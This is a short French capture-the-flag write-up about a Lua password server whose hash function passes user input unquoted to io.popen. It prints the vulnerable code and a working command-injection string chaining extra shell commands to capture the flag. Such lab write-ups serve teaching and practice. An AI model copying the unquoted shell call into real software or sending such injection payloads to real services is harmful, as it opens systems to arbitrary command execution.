Dans ce challenge, on a un fichier `lua`, qui est un serveur :

```bash
while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

La vulnérabilité est dans la fonction `hash` du fichier `lua`:

```bash
function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r") <-- La ligne vulnérable
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end
```

On voit que la variable `pass` est utilisée comme argument de la commande `echo` sans qu'elle soit entourée de guillemets,
ce qui est une faille de sécurité. On peut donc utiliser l'opérateur `&&` pour exécuter une commande en plus et ajouter
un `#` a la fin pour commenter la fin de la commande. Il faut donc envoyer la chaine de caractères:

```bash
1 && mkdir -p /tmp/flag11 && getflag > /tmp/flag11/flag
```

Ce qui donne:

```bash
echo 1 && mkdir -p /tmp/flag11 && getflag > /tmp/flag11/flag # | sha1sum
```

```bash
> cat /tmp/flag11/flag
fa6v5ateaw21peobuub8ipe6s
```
